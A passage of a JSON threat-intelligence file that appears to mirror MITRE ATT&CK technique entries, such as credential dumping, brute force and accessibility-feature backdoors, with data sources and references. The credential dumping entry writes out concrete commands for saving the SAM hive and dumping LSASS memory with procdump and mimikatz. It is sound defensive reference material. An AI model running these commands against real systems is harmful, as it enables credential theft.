          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "Binary file metadata",
          "File monitoring",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1002",
          "https://en.wikipedia.org/wiki/List_of_file_signatures"
        ]
      },
      "uuid": "b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4",
      "value": "Data Compressed - T1002"
    },
    {
      "description": "Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\n### Windows\n\n#### SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n#### Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n \nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n#### Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s * .xml\n\n#### Service Principal Names (SPNs)\n\nSee [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n\n#### Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can be used to enumerate credentials:\n\n* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n#### DCSync\n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n### Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",
      "meta": {
        "external_id": "T1003",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Process monitoring",
          "PowerShell logs",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows",
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1003",
          "https://github.com/Neohapsis/creddump7",
          "https://en.wikipedia.org/wiki/Active_Directory",
          "https://msdn.microsoft.com/library/cc422924.aspx",
          "http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx",
          "https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html",
          "https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/",
          "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749211(v=ws.10)",
          "https://msdn.microsoft.com/library/cc228086.aspx",
          "https://msdn.microsoft.com/library/dd207691.aspx",
          "https://wiki.samba.org/index.php/DRSUAPI",
          "https://source.winehq.org/WineAPI/samlib.html",
          "https://adsecurity.org/?p=1729",
          "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",
          "https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM",
          "https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump",
          "https://msdn.microsoft.com/library/cc237008.aspx",
          "https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea",
          "https://github.com/mattifestation/PowerSploit",
          "https://msdn.microsoft.com/library/cc245496.aspx"
        ]
      },
      "uuid": "0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
      "value": "Credential Dumping - T1003"
    },
    {
      "description": "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.",
      "meta": {
        "external_id": "CAPEC-158",
        "kill_chain": [
          "mitre-attack:credential-access",
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Network device logs",
          "Host network interface",
          "Netflow/Enclave netflow",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1040",
          "https://capec.mitre.org/data/definitions/158.html"
        ]
      },
      "uuid": "3257eb21-f9a7-4430-8de1-d8b6e288f529",
      "value": "Network Sniffing - T1040"
    },
    {
      "description": "When operating systems boot up, they can start programs or applications called services that perform background system functions. (Citation: TechNet Services) A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. \n\nAdversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [Masquerading](https://attack.mitre.org/techniques/T1036). Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1035).",
      "meta": {
        "external_id": "CAPEC-550",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "Process monitoring",
          "Process command-line parameters",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1050",
          "https://capec.mitre.org/data/definitions/550.html",
          "https://technet.microsoft.com/en-us/library/cc772408.aspx",
          "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697",
          "https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "478aa214-2ca7-4ec0-9978-18798e514790",
      "value": "New Service - T1050"
    },
    {
      "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
      "meta": {
        "external_id": "T1008",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Malware reverse engineering",
          "Netflow/Enclave netflow",
          "Packet capture",
          "Process monitoring",
          "Process use of network"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1008",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "f24faf46-3b26-4dbb-98f2-63460498e433",
      "value": "Fallback Channels - T1008"
    },
    {
      "description": "Adversaries can use binary padding to add junk data and change the on-disk representation of malware without affecting the functionality or behavior of the binary. This will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.\n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blacklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)\n",
      "meta": {
        "external_id": "CAPEC-572",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Binary file metadata",
          "File monitoring",
          "Malware reverse engineering"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1009",
          "https://capec.mitre.org/data/definitions/572.html",
          "https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/",
          "https://securelist.com/old-malware-tricks-to-bypass-detection-in-the-age-of-big-data/78010/",
          "https://www.virustotal.com/en/faq/ "
        ]
      },
      "uuid": "519630c5-f03f-4882-825c-3af924935817",
      "value": "Binary Padding - T1009"
    },
    {
      "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the internet and then the proxy would forward communications to the C2 server.\n\nInternal connection proxies can be used to consolidate internal connections from compromised systems. Adversaries may use a compromised internal system as a proxy in order to conceal the true destination of C2 traffic. The proxy can redirect traffic from compromised systems inside the network to an external C2 server making discovery of malicious traffic difficult. Additionally, the network can be used to relay information from one system to another in order to avoid broadcasting traffic to all systems.",
      "meta": {
        "external_id": "T1090",
        "kill_chain": [
          "mitre-attack:command-and-control",
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process use of network",
          "Process monitoring",
          "Netflow/Enclave netflow",
          "Packet capture"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1090",
          "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "731f4f55-b6d0-41d1-a7a9-072a66389aea",
      "value": "Connection Proxy - T1090"
    },
    {
      "description": "Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.\n\n[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)\n\nAdversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nA related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "meta": {
        "external_id": "CAPEC-49",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Office 365 account logs",
          "Authentication logs"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "Office 365",
          "Azure AD",
          "SaaS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1110",
          "https://capec.mitre.org/data/definitions/49.html",
          "https://en.wikipedia.org/wiki/Password_cracking",
          "https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf",
          "http://www.blackhillsinfosec.com/?p=4645",
          "https://www.us-cert.gov/ncas/alerts/TA18-086A",
          "https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing"
        ]
      },
      "uuid": "a93494bb-4b80-4ea1-8695-3236a49916fd",
      "value": "Brute Force - T1110"
    },
    {
      "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "meta": {
        "external_id": "CAPEC-647",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1012",
          "https://capec.mitre.org/data/definitions/647.html",
          "https://en.wikipedia.org/wiki/Windows_Registry"
        ]
      },
      "uuid": "c32f7008-9fea-41f7-8366-5eb9b74bd896",
      "value": "Query Registry - T1012"
    },
    {
      "description": "An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.",
      "meta": {
        "external_id": "CAPEC-555",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "Authentication logs"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1021",
          "https://capec.mitre.org/data/definitions/555.html"
        ]
      },
      "uuid": "54a649ff-439a-41a4-9856-8d144a2551ba",
      "value": "Remote Services - T1021"
    },
    {
      "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.\n\nThese commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "meta": {
        "external_id": "T1102",
        "kill_chain": [
          "mitre-attack:command-and-control",
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Host network interface",
          "Netflow/Enclave netflow",
          "Network protocol analysis",
          "Packet capture",
          "SSL/TLS inspection"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1102",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "830c9528-df21-472c-8c14-a036bf17d665",
      "value": "Web Service - T1102"
    },
    {
      "description": "Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Endgame Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry)\n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
      "meta": {
        "external_id": "T1103",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Loaded DLLs",
          "Process monitoring",
          "Windows Registry"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1103",
          "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
          "https://support.microsoft.com/en-us/kb/197571",
          "https://msdn.microsoft.com/en-us/library/dn280412",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "317fefa6-46c7-4062-adb6-2008cf6bcb41",
      "value": "AppInit DLLs - T1103"
    },
    {
      "description": "A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",
      "meta": {
        "external_id": "T1013",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "API monitoring",
          "DLL monitoring",
          "Windows Registry",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1013",
          "http://msdn.microsoft.com/en-us/library/dd183341",
          "https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "1f47e2fd-fa77-4f2f-88ee-e85df308f125",
      "value": "Port Monitors - T1013"
    },
    {
      "description": "Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nFor the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for the accessibility program (e.g., \"utilman.exe\"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
      "meta": {
        "external_id": "CAPEC-558",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1015",
          "https://capec.mitre.org/data/definitions/558.html",
          "https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html",
          "https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom",
          "http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/"
        ]
      },
      "uuid": "9b99b83a-1aac-4e29-b975-b374950551a3",
      "value": "Accessibility Features - T1015"
    },
    {
      "description": "Adversaries may abuse clipboard functionality to intercept and replace information in the Android device clipboard.(Citation: ESET Clipboard Modification February 2019)(Citation: Welivesecurity Clipboard Modification February 2019)(Citation: Syracuse Clipboard Modification 2014) Malicious applications may monitor the clipboard activity through the <code>ClipboardManager.OnPrimaryClipChangedListener</code> interface on Android to determine when the clipboard contents have changed.(Citation: Dr.Webb Clipboard Modification origin2 August 2018)(Citation: Dr.Webb Clipboard Modification origin August 2018) Listening to clipboard activity, reading the clipboard contents, and modifying the clipboard contents requires no explicit application permissions and can be performed by applications running in the background, however, this behavior has changed with the release of Android 10.(Citation: Android 10 Privacy Changes)\n\nAdversaries may use [Clipboard Modification](https://attack.mitre.org/techniques/T1510) to replace text prior to being pasted, for example, replacing a copied Bitcoin wallet address with a wallet address that is under adversarial control.\n\n[Clipboard Modification](https://attack.mitre.org/techniques/T1510) had been seen within the Android/Clipper.C trojan. This sample had been detected by ESET in an application distributed through the Google Play Store targeting cryptocurrency wallet numbers.(Citation: ESET Clipboard Modification February 2019)",
      "meta": {
        "external_id": "T1510",
        "kill_chain": [
          "mitre-mobile-attack:impact"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1510",
          "https://www.eset.com/uk/about/newsroom/press-releases/first-clipper-malware-discovered-on-google-play-1/",
          "https://www.welivesecurity.com/2019/02/08/first-clipper-malware-google-play/",
          "http://www.cis.syr.edu/~wedu/Research/paper/clipboard_attack_dimva2014.pdf",
          "https://vms.drweb.com/virus/?i=17517761",
          "https://vms.drweb.com/virus/?i=17517750",
          "https://developer.android.com/about/versions/10/privacy/changes#clipboard-data"
        ]
      },
      "uuid": "e399430e-30b7-48c5-b70a-f44dc8c175cb",
      "value": "Clipboard Modification - T1510"
    },
    {
      "description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",
      "meta": {
        "external_id": "T1150",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1150",
          "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/"
        ]
      },
      "uuid": "06780952-177c-4247-b978-79c357fb311f",
      "value": "Plist Modification - T1150"
    },
    {
